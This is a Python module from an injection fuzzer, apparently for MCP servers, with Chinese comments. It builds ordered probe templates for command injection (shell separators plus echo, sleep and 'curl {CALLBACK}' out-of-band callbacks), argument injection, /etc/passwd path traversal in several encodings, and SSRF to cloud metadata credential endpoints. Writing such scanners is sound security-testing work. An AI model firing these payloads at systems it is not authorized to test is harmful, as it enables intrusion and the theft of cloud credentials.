"""各注入类别的判定套件（battery）：技术原语 × 语境/编码/目标变体 的有序模板。

见 docs/载荷合成模块设计.md 与 docs/漏洞类型与检测手段.md。
- 每条模板 = {value, channel, control, expect, delay_target, technique}；value 里的
  {CALLBACK}/{TOKEN} 占位符由 core 在铸造 oracle 观测物后替换。
- 列表按"最可能命中 / 不依赖出网在前"排序，供按预算取 top-N（floor 也至少取前几条）。
- 通道：inband（响应/报错里匹配签名，网络无关）/ timing（时延差）/ oob（带外回连）/
  differential（与基线响应做差分）。程序感知载荷已放弃，这里全部是通用静态模板。
"""
from __future__ import annotations

from mcpfuzz.sink.types import AI, CI, PT, SSRF

# ---------------- 命令注入 ----------------
# shell 语境变体：{c} 为要注入的命令。常见、易命中的在前。
_CI_CONTEXTS = ["; {c}", "| {c}", "&& {c}", "$({c})", "`{c}`", "\n{c}\n",
                "'; {c} #", '"; {c} #', "& {c}", "|| {c}"]

# 路径穿越：读真实系统文件 /etc/passwd（稳定特征串），覆盖多种编码/深度变体。
_PT_VALUES = [
    "../../../../../../etc/passwd",
    "../../../../../../../../../../etc/passwd",
    "/etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "../../../../etc/passwd",
]
_PT_SIGNATURES = ["root:x:0:0:", "root:x:0:0", "daemon:x:"]

# SSRF：信任边界目标（云元数据有稳定签名）。
_SSRF_META_SIGS = ["ami-id", "instance-id", "security-credentials", "meta-data", "iam/", "hostname"]


def _ci_battery() -> list[dict]:
    out = []
    for ctx in _CI_CONTEXTS:
        # inband：回显唯一 token（网络无关，最稳）
        out.append({"value": ctx.format(c="echo {TOKEN}"), "channel": "inband",
                    "expect": None, "control": None, "delay_target": 0.0,
                    "technique": f"ci:echo:{ctx[:4]}"})
        # timing：盲判，无需出网；对照为同语境的零延时
        out.append({"value": ctx.format(c="sleep 5"), "channel": "timing",
                    "expect": None, "control": ctx.format(c="sleep 0"), "delay_target": 5.0,
                    "technique": f"ci:sleep:{ctx[:4]}"})
        # oob：带外回连
        out.append({"value": ctx.format(c="curl {CALLBACK}"), "channel": "oob",
                    "expect": None, "control": None, "delay_target": 0.0,
                    "technique": f"ci:curl:{ctx[:4]}"})
    # cross_tool：写 canary 文件到 /tmp/{token}，再由读工具读回（网络无关、无需回显）。
    # 排在末尾（低优先）：仅当目标服务存在配套读文件工具、且前面通道未确认时才真正发挥作用。
    for ctx in _CI_CONTEXTS[:3]:
        out.append({"value": ctx.format(c="echo {TOKEN} > /tmp/{TOKEN}"), "channel": "cross_tool",
                    "expect": None, "control": None, "delay_target": 0.0,
                    "technique": f"ci:writecanary:{ctx[:4]}"})
    return out


def _ai_battery() -> list[dict]:
    # 程序无关：未知选项带 token（报错回显即证"被当选项解析"）在前；再 --version/--help 差分。
    return [
        {"value": "--mcpf-probe-{TOKEN}", "channel": "inband", "expect": None,
         "control": None, "delay_target": 0.0, "technique": "ai:unknown-option"},
        {"value": "--mcpf-probe-{TOKEN}=1", "channel": "inband", "expect": None,
         "control": None, "delay_target": 0.0, "technique": "ai:unknown-option-eq"},
        {"value": "--version", "channel": "differential", "expect": None,
         "control": None, "delay_target": 0.0, "technique": "ai:--version"},
        {"value": "--help", "channel": "differential", "expect": None,
         "control": None, "delay_target": 0.0, "technique": "ai:--help"},
        {"value": "-h", "channel": "differential", "expect": None,
         "control": None, "delay_target": 0.0, "technique": "ai:-h"},
    ]


def _pt_battery() -> list[dict]:
    return [{"value": v, "channel": "inband", "expect": list(_PT_SIGNATURES),
             "control": None, "delay_target": 0.0, "technique": f"pt:{v[:18]}"}
            for v in _PT_VALUES]


def _ssrf_battery() -> list[dict]:
    out = [
        # 带外回连：服务端去请求我方 token（证明"发起了请求"；须配边界判别，弱）。
        # {CALLBACK} 已是完整 URL（含 scheme），不要再加 http:// 前缀。
        {"value": "{CALLBACK}", "channel": "oob", "expect": None,
         "control": None, "delay_target": 0.0, "technique": "ssrf:oob"},
        {"value": "{CALLBACK}/x", "channel": "oob", "expect": None,
         "control": None, "delay_target": 0.0, "technique": "ssrf:oob-path"},
    ]
    # 信任边界：云元数据端点（有稳定签名 → inband 强证据）
    for url in ("http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/"):
        out.append({"value": url, "channel": "inband", "expect": list(_SSRF_META_SIGS),
                    "control": None, "delay_target": 0.0, "technique": f"ssrf:meta:{url[:24]}"})
    return out


_BATTERIES = {CI: _ci_battery, AI: _ai_battery, PT: _pt_battery, SSRF: _ssrf_battery}


def get_battery(vuln_class: str) -> list[dict]:
    """返回某注入类别的有序模板列表；未支持的类别返回空。"""
    fn = _BATTERIES.get(vuln_class)
    return fn() if fn else []
